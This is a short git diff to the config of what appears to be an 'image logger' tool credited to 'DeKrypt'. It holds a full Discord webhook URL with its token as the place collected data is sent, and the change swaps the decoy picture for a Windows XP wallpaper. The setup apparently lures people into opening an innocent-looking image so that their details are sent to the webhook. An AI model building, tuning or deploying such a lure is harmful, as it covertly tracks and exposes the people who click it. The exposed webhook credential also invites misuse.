@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1372231033793286245/9ZC1SBgbOTVzwCOHLDyTwrmBOh12WgcnTgTjHofREaatzP38DMrxbJnk3fmP1JYIM_Ka",
-    "image": "https://www.lifewire.com/thmb/RYYY7FRD7qz__Nir8Nf_1wnZlz0=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/009-how-to-create-a-desktop-shortcut-on-windows-bf4f5510ddab4da297d068e1b04fcfde.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
